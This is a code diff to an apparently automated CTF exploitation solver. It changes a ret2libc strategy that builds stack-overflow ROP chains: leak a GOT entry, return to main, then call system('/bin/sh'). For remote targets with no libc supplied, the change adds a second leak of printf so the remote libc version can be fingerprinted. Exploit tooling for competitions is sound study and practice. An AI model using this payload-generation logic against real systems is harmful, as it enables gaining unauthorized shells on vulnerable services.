@@ -521,6 +521,8 @@ def s_ret2libc(ch: Challenge, f: Facts) -> Iterable[Plan]:
     """两阶段：泄漏 GOT -> 回主函数 -> system('/bin/sh')。
 
     这是一个「会执行两次」的特殊策略：Plan 带 tag=stage1，由 orchestrator 识别。
+    远程且用户没给 libc 时，stage1 额外多泄一个 GOT（printf），供 low12 指纹识别
+    远程 libc 版本（v7.0.4）——本地 / 自带 libc 的路径保持单泄不变。
     """
     if ch.elf.pie or ch.libc_elf is None:
         return
@@ -535,16 +537,30 @@ def s_ret2libc(ch: Challenge, f: Facts) -> Iterable[Plan]:
     pop_rdi = f.gadgets.get("pop_rdi")
     if not got or (ch.elf.bits == 64 and not pop_rdi):
         return
+    # 双泄条件：远程 + 用户没给 libc 文件（ch.libc_elf 是容器兜底 libc）
+    remote_no_libc = bool(getattr(ch, "host", None)) and not ch.libc_path
+    got2 = ch.got("printf") if remote_no_libc and ch.elf.bits == 64 else None
+    if remote_no_libc and ch.elf.bits == 64 and not got2:
+        return
     for off, sink in _offsets(ch, f):
-        for pre in _presets(ch, f):
+        presets = _presets(ch, f)
+        if got2:
+            # 远程双泄 plan：scanf preset 会把 cont 喂成非 0 值直接退出循环
+            # （repeater 实测 1024 → puts(stupid) → 程序结束），破坏三阶段时序。
+            # read sink 的溢出本来就不需要 preset，远程只跑干净 payload。
+            presets = [b""]
+        for pre in presets:
             if ch.elf.bits == 64:
-                payload = (_pad(ch, off) + _align(ch, f, True)
-                           + ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt) + ch.p64(main))
+                chain = ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt)
+                if got2:
+                    chain += ch.p64(pop_rdi) + ch.p64(got2) + ch.p64(leak_plt)
+                payload = _pad(ch, off) + _align(ch, f, True) + chain + ch.p64(main)
             else:
                 payload = (_pad(ch, off) + ch.p32(leak_plt) + ch.p32(main) + ch.p32(got))
             sends = ([pre] if pre else []) + [payload + _term(sink)]
+            extra = "+printf" if got2 else ""
             yield Plan("ret2libc", sends,
-                       f"leak {leak_name}@{hex(got)} off={off}",
+                       f"leak {leak_name}{extra}@{hex(got)} off={off}",
                        tag=f"stage1:{leak_name}:{off}:{sink}")
 
 
